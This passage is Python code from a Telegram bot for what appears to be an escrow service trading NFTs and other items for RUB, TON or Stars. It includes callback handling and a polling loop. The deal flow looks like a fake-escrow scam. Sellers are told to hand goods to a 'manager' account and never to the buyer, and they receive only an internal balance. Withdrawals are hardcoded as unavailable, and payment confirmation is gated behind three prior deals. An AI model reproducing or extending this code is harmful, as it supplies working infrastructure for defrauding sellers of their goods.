                deal = connection.execute("SELECT * FROM deals WHERE id=?", (argument[5:],)).fetchone()
                if deal:
                    show_deal(connection, chat["id"], deal, get_language(connection, user_id) or "ru", user_id)
                else:
                    send(chat["id"], say(get_language(connection, user_id) or "ru", "deal_missing"))
            elif get_language(connection, user_id):
                clear_draft(connection, user_id)
                menu(chat["id"], get_language(connection, user_id))
            else:
                show_language(chat["id"], "ru", emoji_id)
        elif command == "/message":
            parts = value.split(" ", 2)
            if len(parts) < 3 or not parts[2].strip():
                send(chat["id"], say(get_language(connection, user_id) or "ru", "message_usage"))
            else:
                deal = connection.execute("SELECT * FROM deals WHERE id=?", (parts[1],)).fetchone()
                if deal and deal[8] in ("active", "payment_confirmed", "transfer_requested") and user_id in (deal[1], deal[2]):
                    other = deal[2] if user_id == deal[1] else deal[1]
                    send(other, say(get_language(connection, other) or "ru", "message_received", id=deal[0], text=parts[2][:3000]))
                    send(chat["id"], say(get_language(connection, user_id) or "ru", "message_sent"))
                else:
                    send(chat["id"], say(get_language(connection, user_id) or "ru", "active_missing"))
        elif value and not value.startswith("/"):
            handle_text(connection, user_id, chat["id"], value)
        return

    callback = update.get("callback_query")
    if not callback:
        return
    callback_id = callback["id"]
    data = callback.get("data", "")
    user_id = callback.get("from", {}).get("id")
    chat_id = callback.get("message", {}).get("chat", {}).get("id")
    remember_user(connection, callback.get("from", {}))
    if data.startswith("lang:") and user_id and chat_id:
        language = data[5:]
        if language in LANGUAGES:
            set_language(connection, user_id, language)
            clear_draft(connection, user_id)
            api("answerCallbackQuery", {"callback_query_id": callback_id})
            try:
                api("deleteMessage", {"chat_id": chat_id, "message_id": callback["message"]["message_id"]})
            except (HTTPError, URLError, OSError, RuntimeError):
                pass
            menu(chat_id, language)
            return
    if user_id and chat_id:
        language = get_language(connection, user_id) or "ru"
        if data == "language":
            show_language(chat_id, language, emoji_id)
        elif data == "menu":
            clear_draft(connection, user_id)
            menu(chat_id, language)
        elif data == "create":
            clear_draft(connection, user_id)
            send(chat_id, label(language, "role"), [[(label(language, "seller"), "role:seller")], [(label(language, "buyer"), "role:buyer")], [(label(language, "back"), "menu")]])
        elif data.startswith("role:") and data[5:] in ("seller", "buyer"):
            set_draft(connection, user_id, "type", {"role": data[5:]})
            send(chat_id, label(language, "type"), [[(type_label(language, i), f"type:{i}")] for i in range(len(TYPES))] + [[(label(language, "back"), "menu")]])
        elif data.startswith("type:"):
            stage, draft = get_draft(connection, user_id)
            index = data[5:]
            if stage == "type" and index.isdigit() and int(index) < len(TYPES):
                draft["item_type"] = TYPES[int(index)]
                set_draft(connection, user_id, "method", draft)
                send(chat_id, f"💼 {label(language, 'create')}\n\n🛒 {type_label(language, int(index))}\n\n{label(language, 'method')}", [[(method_label(language, i), f"method:{i}")] for i in range(len(METHODS))] + [[(label(language, "requisites"), "requisites")], [(label(language, "back"), "menu")]])
        elif data.startswith("method:"):
            stage, draft = get_draft(connection, user_id)
            index = data[7:]
            if stage == "method" and index.isdigit() and int(index) < len(METHODS):
                draft["method"] = METHODS[int(index)]
                if int(index) == 2:
                    set_draft(connection, user_id, "country", draft)
                    rows = [[(COUNTRIES[i], f"country:{i}")] + ([(COUNTRIES[i + 1], f"country:{i + 1}")] if i + 1 < len(COUNTRIES) else []) for i in range(0, len(COUNTRIES), 2)]
                    send(chat_id, {"ru": "Выберите страну получения оплаты:", "en": "Choose the payment country:", "zh": "请选择收款国家："}[language], rows + [[(label(language, "back"), "menu")]])
                elif int(index) in (0, 1):
                    field = "ton_wallet" if int(index) == 0 else "card_or_phone"
                    details = connection.execute(f"SELECT {field} FROM requisites WHERE user_id=?", (user_id,)).fetchone()
                    if details and details[0]:
                        draft["payment_details"] = details[0]
                        set_draft(connection, user_id, "amount", draft)
                        send_amount_prompt(chat_id, language, draft["method"])
                    else:
                        draft["resume"] = True
                        set_draft(connection, user_id, field, draft)
                        send(chat_id, f"{label(language, 'ton' if field == 'ton_wallet' else 'card')}:\n\n{say(language, 'details_prompt')}", [[(label(language, "back"), "menu")]], animation="balance")
                else:
                    set_draft(connection, user_id, "amount", draft)
                    send_amount_prompt(chat_id, language, draft["method"])
        elif data.startswith("country:"):
            stage, draft = get_draft(connection, user_id)
            index = data[8:]
            if stage == "country" and index.isdigit() and int(index) < len(COUNTRIES):
                draft["country"] = COUNTRIES[int(index)]
                set_draft(connection, user_id, "country_details", draft)
                send(chat_id, f"💳 {label(language, 'card')} ({draft['country']}):\n\n{say(language, 'details_prompt')}", [[(label(language, "back"), "menu")]], animation="balance")
        elif data == "market":
            menu(chat_id, language)
        elif data == "my_deals":
            deals = connection.execute("SELECT * FROM deals WHERE creator_id=? OR buyer_id=? ORDER BY rowid DESC LIMIT 20", (user_id, user_id)).fetchall()
            send(chat_id, label(language, "mine" if deals else "mine_empty"), [[(f"{d[4]} — {d[6]} ({d[8]})", f"deal:{d[0]}")] for d in deals] + [[(label(language, "back"), "menu")]])
        elif data.startswith("deal:"):
            deal = connection.execute("SELECT * FROM deals WHERE id=?", (data[5:],)).fetchone()
            if deal:
                show_deal(connection, chat_id, deal, language, user_id)
        elif data.startswith("cancel:"):
            deal = connection.execute("SELECT * FROM deals WHERE id=?", (data[7:],)).fetchone()
            allowed = deal and ((deal[8] == "open" and deal[1] == user_id) or (deal[8] == "payment_confirmed" and parties(deal)[0] == user_id))
            changed = connection.execute("UPDATE deals SET status='cancelled' WHERE id=? AND status=?", (data[7:], deal[8])).rowcount if allowed else 0
            connection.commit()
            send(chat_id, say(language, "cancelled" if changed else "unavailable"), [[(label(language, "back"), "menu")]])
        elif data == "balance":
            details = connection.execute("SELECT ton_wallet, card_or_phone FROM requisites WHERE user_id=?", (user_id,)).fetchone() or (None, None)
            completed = connection.execute("SELECT COUNT(*) FROM deals WHERE (creator_id=? OR buyer_id=?) AND status='finished'", (user_id, user_id)).fetchone()[0]
            rub, ton, stars = (balance(connection, user_id, currency) for currency in ("RUB", "TON", "Stars"))
            username = callback.get("from", {}).get("username")
            identity = f"@{username}" if username else f"#{user_id}"
            text = (f"ВАШ БАЛАНС\n\n👋 Пользователь: {identity}\n\nДоступные средства:\n"
                    f"💸 {rub:.2f} RUB\n💎 {ton:.2f} TON\n{stars:.2f} Stars\n◆ 0.00 GRAM\n\n"
                    f"💳 Информация о выводе средств:\n💎 TON-кошелек: {details[0] or '❌ TON-кошелек не добавлен'}\n"
                    f"💳 Карта / СБП: {details[1] or '❌ Реквизиты не добавлены'}\n\n"
                    f"📂 Информация:\n• Комиссия системы: 1%\n• Вывод доступен на карту, номер или TON-кошелек\n\n"
                    f"💼 Успешных сделок: {completed}")
            if language == "en":
                text = (f"YOUR BALANCE\n\n👋 User: {identity}\n\nAvailable funds:\n💸 {rub:.2f} RUB\n💎 {ton:.2f} TON\n{stars:.2f} Stars\n◆ 0.00 GRAM\n\n"
                        f"💳 Withdrawal info:\n💎 TON wallet: {details[0] or '❌ TON wallet not added'}\n"
                        f"💳 Card / SBP: {details[1] or '❌ Requisites not added'}\n\n"
                        f"📂 Info:\n• System commission: 1%\n• Withdrawal available to card, number or TON wallet\n\n💼 Successful deals: {completed}")
            elif language == "zh":
                text = (f"您的余额\n\n👋 用户: {identity}\n\n可用资金:\n💸 {rub:.2f} RUB\n💎 {ton:.2f} TON\n{stars:.2f} Stars\n◆ 0.00 GRAM\n\n"
                        f"💳 提款信息:\n💎 TON钱包: {details[0] or '❌ 未添加TON钱包'}\n"
                        f"💳 银行卡 / SBP: {details[1] or '❌ 未添加收款信息'}\n\n"
                        f"📂 信息:\n• 系统佣金: 1%\n• 可提款至银行卡、号码或TON钱包\n\n💼 成功交易: {completed}")
            balance_bold = {"ru": ("ВАШ БАЛАНС", "Доступные средства:"), "en": ("YOUR BALANCE", "Available funds:"), "zh": ("您的余额", "可用资金:")}[language]
            send(chat_id, text, [[(label(language, "withdraw"), "withdraw")], [(label(language, "history"), "history")], [(label(language, "back"), "menu")]], animation="balance", bold=balance_bold)
        elif data == "requisites":
            details = connection.execute("SELECT ton_wallet, card_or_phone FROM requisites WHERE user_id=?", (user_id,)).fetchone() or (None, None)
            text = f"📩 {label(language, 'requisites')}\n\n💎 TON: {details[0] or '❌'}\n💳 Card / phone: {details[1] or '❌'}"
            send(chat_id, text, [[(label(language, "ton"), "set:ton_wallet")], [(label(language, "card"), "set:card_or_phone")], [(label(language, "back"), "menu")]])
        elif data.startswith("set:") and data[4:] in ("ton_wallet", "card_or_phone"):
            set_draft(connection, user_id, data[4:], {})
            prompt = label(language, "ton" if data[4:] == "ton_wallet" else "card")
            send(chat_id, f"{prompt}:\n\n{say(language, 'details_prompt')}", [[(label(language, "back"), "menu")]], animation="balance")
        elif data == "history":
            events = connection.execute("SELECT currency, amount, source FROM balance_events WHERE user_id=? ORDER BY id DESC LIMIT 20", (user_id,)).fetchall()
            if events:
                lines = [f"+{amount} {currency} — {'MainTeam' if source.startswith('mainteam:') else source}" for currency, amount, source in events]
                text = f"{label(language, 'history')}:\n\n" + "\n".join(lines)
            else:
                text = {"ru": "История операций пуста.", "en": "Transaction history is empty.", "zh": "暂无交易记录。"}[language]
            send(chat_id, text, [[(label(language, "back"), "menu")]])
        elif data == "withdraw":
            send(chat_id, {"ru": "Вывод средств пока не подключён.", "en": "Withdrawals are not connected yet.", "zh": "提现功能尚未接入。"}[language], [[(label(language, "back"), "menu")]])
        elif data.startswith("accept:"):
            deal = connection.execute("SELECT * FROM deals WHERE id=?", (data[7:],)).fetchone()
            if deal and deal[8] == "open" and deal[1] != user_id:
                changed = connection.execute("UPDATE deals SET buyer_id=?, status='active' WHERE id=? AND status='open'", (user_id, deal[0])).rowcount
                connection.commit()
                if changed:
                    updated = connection.execute("SELECT * FROM deals WHERE id=?", (deal[0],)).fetchone()
                    show_deal(connection, chat_id, updated, language, user_id)
                    creator_language = get_language(connection, deal[1]) or "ru"
                    successful = connection.execute("SELECT COUNT(*) FROM deals WHERE (creator_id=? OR buyer_id=?) AND status='finished'", (user_id, user_id)).fetchone()[0]
                    verified_row = connection.execute("SELECT verified FROM users WHERE user_id=?", (user_id,)).fetchone()
                    verified_text = "✅ Проверенный пользователь" if verified_row and verified_row[0] else "⚠️ Пользователь не проверен"
                    if creator_language == "ru":
                        notice = f"👋 Пользователь {user_name(connection, user_id)}\nПрисоединился к сделке #{deal[0]}\n\n📂 Успешных сделок покупателя: {successful}\n{verified_text}\n\nПроверьте соответствие пользователя"
                    else:
                        notice = say(creator_language, "joined", id=deal[0], user=user_name(connection, user_id), hint=say(creator_language, "chat_hint", id=deal[0]))
                    send(deal[1], notice)
            else:
                send(chat_id, say(language, "unavailable"))
        elif data.startswith("paid:"):
            deal = connection.execute("SELECT * FROM deals WHERE id=?", (data[5:],)).fetchone()
            if deal and deal[8] == "active" and user_id == parties(deal)[1]:
                verified = connection.execute("SELECT verified FROM users WHERE user_id=?", (user_id,)).fetchone()
                count = connection.execute("SELECT COUNT(*) FROM deals WHERE (creator_id=? OR buyer_id=?) AND status='finished'", (user_id, user_id)).fetchone()[0]
                if not (verified and verified[0]) and count < 3:
                    send(chat_id, "Для подтверждения оплаты нужно провести минимум 3 успешных сделки.")
                else:
                    connection.execute("UPDATE deals SET status='payment_confirmed' WHERE id=? AND status='active'", (deal[0],))
                    connection.commit()
                    seller_id = parties(deal)[0]
                    commission = (Decimal(deal[6]) * Decimal("0.01")).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
                    seller_amount = Decimal(deal[6]) - commission
                    buyer_notice = "✅ Оплата подтверждена! Продавец уведомлен о вашем платеже.\n\n💸 Ожидайте подтверждения передачи NFT от менеджера...\n\n📂 Ваша статистика будет обновлена после подтверждения менеджером.\n\nОжидайте получения товара через менеджера."
                    send(chat_id, buyer_notice, [[(label(language, "back"), "menu")]])
                    seller_notice = (f"ПЛАТЁЖ ПОДТВЕРЖДЁН!\n\n✅ Покупатель {user_name(connection, user_id)} подтвердил оплату\n📜 Сделка: #{deal[0]}\n"
                                     f"💼 Товар: {deal[7]}\n💸 Сумма: {deal[6]} {currency_for(deal[5])}\n\n📂 Финансовые условия:\n"
                                     f"• Комиссия системы: 1% ({commission:g} {currency_for(deal[5])})\n• К зачислению на баланс: {seller_amount:g} {currency_for(deal[5])}\n\n"
                                     f"ТРЕБУЕТСЯ ВАШЕ ДЕЙСТВИЕ:\n1. Передайте товар менеджеру https://t.me/{SUPPORT_USERNAME}\n"
                                     f"2. После передачи нажмите кнопку ниже\n3. Менеджер подтвердит получение товара\n"
                                     f"4. Сумма {seller_amount:g} {currency_for(deal[5])} будет зачислена на ваш баланс\n\n❌ Не передавайте товар покупателю напрямую!")
                    send(seller_id, seller_notice, [[("Передать Товар Менеджеру", f"https://t.me/{SUPPORT_USERNAME}")], [("Готово - передано", f"transfer:{deal[0]}")], [("Отменить сделку", f"cancel:{deal[0]}")]], bold=("ПЛАТЁЖ ПОДТВЕРЖДЁН!", f"#{deal[0]}", "Финансовые условия:", "ТРЕБУЕТСЯ ВАШЕ ДЕЙСТВИЕ:"))
            else:
                send(chat_id, say(language, "unavailable"))
        elif data.startswith("transfer:"):
            deal = connection.execute("SELECT * FROM deals WHERE id=?", (data[9:],)).fetchone()
            if deal and deal[8] == "payment_confirmed" and user_id == parties(deal)[0]:
                connection.execute("UPDATE deals SET status='transfer_requested' WHERE id=? AND status='payment_confirmed'", (deal[0],))
                connection.commit()
                commission = (Decimal(deal[6]) * Decimal("0.01")).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
                net = Decimal(deal[6]) - commission
                send(chat_id, f"✅ Заявка на передачу отправлена!\n\n📂 Сделка: #{deal[0]}\n💼 Товар: {deal[7]}\n💸 К зачислению: {net:g} {currency_for(deal[5])}\n\nОжидайте подтверждения менеджера.", [[(label(language, "back"), "menu")]], bold=("Заявка на передачу отправлена!", f"#{deal[0]}", f"{net:g} {currency_for(deal[5])}"))
                for manager_id in MANAGER_IDS:
                    try:
                        send(manager_id, f"Сделка {deal[0]} ожидает подтверждения получения товара.", [[("Подтвердить получение", f"approve:{deal[0]}")]])
                    except (HTTPError, URLError, RuntimeError):
                        logging.warning("Could not notify manager %s; /pending remains available", manager_id)
            else:
                send(chat_id, say(language, "unavailable"))
        elif data.startswith("approve:"):
            deal = connection.execute("SELECT * FROM deals WHERE id=?", (data[8:],)).fetchone()
            if is_manager(user_id) and deal and deal[8] == "transfer_requested":
                seller_id, actual_buyer_id = parties(deal)
                commission = (Decimal(deal[6]) * Decimal("0.01")).quantize(Decimal("0.01"), rounding=ROUND_HALF_UP)
                amount = Decimal(deal[6]) - commission
                currency = currency_for(deal[5])
                with connection:
                    connection.execute("UPDATE deals SET status='finished' WHERE id=? AND status='transfer_requested'", (deal[0],))
                    connection.execute("INSERT OR IGNORE INTO balance_events (user_id, currency, amount, source) VALUES (?, ?, ?, ?)", (seller_id, currency, str(amount), f"deal:{deal[0]}"))
                send(chat_id, f"✅ Сделка {deal[0]} подтверждена. Продавцу зачислено {amount:g} {currency}.")
                seller_notice = {"ru": f"✅ Сделка завершена!\n\n💸 На ваш баланс зачислено: {amount:g} {currency}\n📜 Сделка: #{deal[0]}\n\nСпасибо за работу!", "en": f"✅ Deal completed!\n\n💸 Credited to your balance: {amount:g} {currency}\n📜 Deal: #{deal[0]}", "zh": f"✅ 交易已完成！\n\n💸 已入账：{amount:g} {currency}\n📜 交易：#{deal[0]}"}
                send(seller_id, seller_notice[get_language(connection, seller_id) or "ru"], bold=("Сделка завершена!", f"{amount:g} {currency}", f"#{deal[0]}") if get_language(connection, seller_id) == "ru" else ())
                buyer_deals = connection.execute("SELECT COUNT(*) FROM deals WHERE (creator_id=? OR buyer_id=?) AND status='finished'", (actual_buyer_id, actual_buyer_id)).fetchone()[0]
                remaining = max(0, 3 - buyer_deals)
                buyer_notice = {"ru": (f"💸 Информация о выводе средств\n\nПо условиям платформы вывод средств доступен после проведения 3 успешных сделок.\n\n"
                                       f"На данный момент у вас: {buyer_deals} сделка.\nОсталось провести ещё: {remaining} сделки.\n\n"
                                       f"По вопросам обратитесь в поддержку — https://t.me/{SUPPORT_USERNAME}"),
                                "en": f"Deal #{deal[0]} completed. Successful deals: {buyer_deals}. Deals until withdrawal eligibility: {remaining}.",
                                "zh": f"交易 #{deal[0]} 已完成。成功交易：{buyer_deals}。距离提现门槛还需：{remaining}。"}
                send(actual_buyer_id, buyer_notice[get_language(connection, actual_buyer_id) or "ru"])
            else:
                send(chat_id, say(language, "unavailable"))
    api("answerCallbackQuery", {"callback_query_id": callback_id})


def main():
    global BOT_USERNAME
    if not TOKEN:
        raise SystemExit("Set BOT_TOKEN before starting the bot")
    os.umask(0o077)
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
    connection = connect_db()
    while not BOT_USERNAME:
        try:
            BOT_USERNAME = api("getMe")["username"]
        except (URLError, OSError, RuntimeError):
            logging.exception("Telegram unavailable at startup; retrying")
            time.sleep(3)
    emoji_id = load_custom_emoji()
    if emoji_id:
        logging.info("Loaded custom emoji from %s", EMOJI_SET)
    offset = None
    while True:
        try:
            updates = api("getUpdates", {
                "offset": offset,
                "timeout": 30,
                "allowed_updates": ["message", "callback_query"],
            }, timeout=40)
            for update in updates:
                offset = update["update_id"] + 1
                try:
                    handle_update(connection, update, emoji_id)
                except (HTTPError, URLError, RuntimeError, OSError, KeyError, sqlite3.Error):
                    logging.exception("Failed to handle update %s", update["update_id"])
        except (HTTPError, URLError, RuntimeError, OSError):
            logging.exception("Polling failed; retrying")
            time.sleep(3)


if __name__ == "__main__":
    main()
